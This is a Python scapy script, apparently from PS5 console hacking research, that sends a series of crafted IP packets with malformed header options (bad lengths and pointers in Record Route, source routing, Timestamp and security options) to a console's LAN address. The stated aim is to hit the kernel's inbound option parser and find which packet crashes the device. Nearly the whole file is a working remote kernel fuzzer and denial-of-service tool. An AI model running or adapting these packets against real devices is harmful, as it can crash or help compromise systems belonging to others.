#!/usr/bin/env python3
"""Send crafted IP packets with malformed options to PS5 LAN IP.

Unlike probe 37 (loopback), these packets arrive at ip_input() on the
INBOUND path, bypassing ip_output()'s option validation. The kernel's
ip_dooptions() processes them in kernel context, outside the syscall sandbox.

Usage:
    pip install scapy
    sudo python ip_options_inject.py --ps5-ip 10.0.0.96

No PS5-side probe needed — a crash kills the console regardless. But running
probe 46b_tcp_enhanced_listener or a simple UDP listener helps verify that
well-formed packets arrive.

Each variant is sent with a 0.5s delay. If the console stops responding
(no more pings), the last logged variant is the suspect.
"""

import argparse
import struct
import sys
import time

try:
    from scapy.all import (IP, UDP, TCP, Raw, IPOption, IPOption_RR,
                           IPOption_LSRR, IPOption_SSRR, IPOption_Timestamp,
                           send, conf, RandShort)
except ImportError:
    print("[!] scapy not installed: pip install scapy")
    sys.exit(1)

LOG = []


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    LOG.append(line)


def build_option_variants(ps5_ip, src_ip):
    """Return (name, IP_packet) pairs with crafted option fields."""
    dst = ps5_ip
    # Use high-numbered UDP port in the bindable range
    dport = 31338
    sport = 12345

    def udp_payload():
        return UDP(sport=sport, dport=dport) / Raw(b"\xC0\xFF\xEE\x11")

    variants = []

    # --- Baseline (no options) ---
    variants.append(("baseline",
        IP(src=src_ip, dst=dst) / udp_payload()))

    # --- Well-formed options (verify delivery) ---
    variants.append(("nop_x4",
        IP(src=src_ip, dst=dst, options=[IPOption(b"\x01"*4)]) / udp_payload()))

    variants.append(("rr_empty",
        IP(src=src_ip, dst=dst, options=[IPOption_RR(pointer=4, routers=["0.0.0.0"])]) /
        udp_payload()))

    variants.append(("ts_basic",
        IP(src=src_ip, dst=dst,
           options=[IPOption_Timestamp(flg=0, pointer=5, length=8)]) /
        udp_payload()))

    # --- Malformed Record Route ---
    # RR with length 0 (classic parser killer)
    variants.append(("rr_len0",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x07\x00\x04\x00\x00\x00\x00")]) /
        udp_payload()))

    # RR with length 1 (less than minimum 3)
    variants.append(("rr_len1",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x07\x01\x04")]) /
        udp_payload()))

    # RR with length 255 (exceeds remaining header space)
    variants.append(("rr_len255",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x07\xff\x04" + b"\x00"*36)]) /
        udp_payload()))

    # RR with pointer 0 (below minimum of 4)
    variants.append(("rr_ptr0",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x07\x07\x00\x00\x00\x00\x00")]) /
        udp_payload()))

    # RR with pointer 250 (way past option data)
    variants.append(("rr_ptr250",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x07\x07\xfa\x00\x00\x00\x00")]) /
        udp_payload()))

    # RR completely full (pointer past end = already recorded)
    variants.append(("rr_full",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x07\x27\x28" +
                             b"\x7f\x00\x00\x01" * 9)]) /
        udp_payload()))

    # --- Malformed LSRR (Loose Source Route) ---
    # LSRR type=131, with PS5 as next hop (should forward to itself)
    variants.append(("lsrr_self",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x83\x0b\x04" +
                             bytes(int(x) for x in ps5_ip.split(".")) +
                             bytes(int(x) for x in ps5_ip.split(".")))]) /
        udp_payload()))

    # LSRR len=0
    variants.append(("lsrr_len0",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x83\x00\x04\x7f\x00\x00\x01")]) /
        udp_payload()))

    # LSRR len=3 (minimum, no addresses)
    variants.append(("lsrr_empty",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x83\x03\x04")]) /
        udp_payload()))

    # LSRR ptr=0 (bad)
    variants.append(("lsrr_ptr0",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x83\x07\x00\x7f\x00\x00\x01")]) /
        udp_payload()))

    # --- Malformed SSRR (Strict Source Route) ---
    # SSRR type=137, same malformations
    variants.append(("ssrr_self",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x89\x0b\x04" +
                             bytes(int(x) for x in ps5_ip.split(".")) +
                             bytes(int(x) for x in ps5_ip.split(".")))]) /
        udp_payload()))

    variants.append(("ssrr_len0",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x89\x00\x04\x7f\x00\x00\x01")]) /
        udp_payload()))

    # --- Malformed Timestamp ---
    # TS type=68, len=0
    variants.append(("ts_len0",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x44\x00\x05\x00")]) /
        udp_payload()))

    # TS len=1
    variants.append(("ts_len1",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x44\x01\x05\x00")]) /
        udp_payload()))

    # TS ptr=0 (below minimum of 5)
    variants.append(("ts_ptr0",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x44\x08\x00\x00\x00\x00\x00\x00")]) /
        udp_payload()))

    # TS flags=0x0F (overflow counter max = 15 + flag bits)
    variants.append(("ts_overflow_max",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x44\x08\x05\xff\x00\x00\x00\x00")]) /
        udp_payload()))

    # TS flag 1 (timestamps with IP addresses) + len too short for pair
    variants.append(("ts_flag1_short",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x44\x08\x05\x01\x00\x00\x00\x00")]) /
        udp_payload()))

    # TS flag 3 (prespecified addresses) with wrong address
    variants.append(("ts_flag3_wrong_addr",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x44\x0c\x05\x03" +
                             b"\xde\xad\xbe\xef\x00\x00\x00\x00")]) /
        udp_payload()))

    # --- Unknown/unusual option types ---
    # Security option (type 130) — classified, rarely tested
    variants.append(("security_opt",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x82\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00")]) /
        udp_payload()))

    # Stream ID (type 136)
    variants.append(("stream_id",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x88\x04\xde\xad")]) /
        udp_payload()))

    # Commercial IP Security (CIPSO, type 134)
    variants.append(("cipso_basic",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x86\x0a\x00\x00\x00\x01\x05\x04\x00\x00")]) /
        udp_payload()))

    # Extended Security (type 133)
    variants.append(("esec",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x85\x08\x00\x00\x00\x00\x00\x00")]) /
        udp_payload()))

    # Router Alert (type 148) — used by IGMP/RSVP, exercises different path
    variants.append(("router_alert",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x94\x04\x00\x00")]) /
        udp_payload()))

    # --- Combinations ---
    # NOP + RR(len=0) + TS(len=0) — chained malformed
    variants.append(("chain_malformed",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x01\x07\x00\x04\x44\x00\x05\x00")]) /
        udp_payload()))

    # Max-size option field (40 bytes) filled with 0xFF
    variants.append(("max_options_ff",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x01" * 40)]) /
        udp_payload()))

    # EOL immediately then garbage (parser should stop at EOL)
    variants.append(("eol_then_rr",
        IP(src=src_ip, dst=dst,
           options=[IPOption(b"\x00\x07\x27\xfa" + b"\x41" * 36)]) /
        udp_payload()))

    return variants


def main():
    ap = argparse.ArgumentParser(description="IP options injection to PS5")
    ap.add_argument("--ps5-ip", required=True, help="PS5 LAN IP")
    ap.add_argument("--src-ip", default=None,
                    help="source IP (default: auto-detect)")
    ap.add_argument("--delay", type=float, default=0.5,
                    help="seconds between packets")
    ap.add_argument("--variant", type=int, default=-1,
                    help="pin a single variant index (-1 = all)")
    ap.add_argument("--rounds", type=int, default=1,
                    help="number of rounds")
    args = ap.parse_args()

    conf.verb = 0

    src_ip = args.src_ip
    if not src_ip:
        # Auto-detect: send a dummy and see what scapy picks
        from scapy.all import get_if_addr, conf as sconf
        src_ip = get_if_addr(sconf.iface)
        if src_ip == "0.0.0.0":
            log("could not auto-detect source IP — use --src-ip")
            sys.exit(1)

    log(f"IP options injection v1")
    log(f"target: {args.ps5_ip}  src: {src_ip}")

    variants = build_option_variants(args.ps5_ip, src_ip)
    log(f"{len(variants)} variants prepared")

    if args.variant >= 0:
        variants = [variants[args.variant % len(variants)]]
        log(f"pinned to: {variants[0][0]}")

    for rnd in range(args.rounds):
        for i, (name, pkt) in enumerate(variants):
            log(f"round {rnd+1} [{i+1}/{len(variants)}]: {name}")
            try:
                send(pkt)
            except Exception as e:
                log(f"  send error: {e}")
            time.sleep(args.delay)

    log("--- done ---")
    log("if console stopped responding, the last logged variant is the suspect")
    log("ping the PS5 to check if it's still alive")

    logfile = f"ip_options_inject_{time.strftime('%Y%m%d_%H%M%S')}.log"
    with open(logfile, "w") as f:
        f.write("\n".join(LOG) + "\n")
    log(f"log saved to {logfile}")


if __name__ == "__main__":
    main()
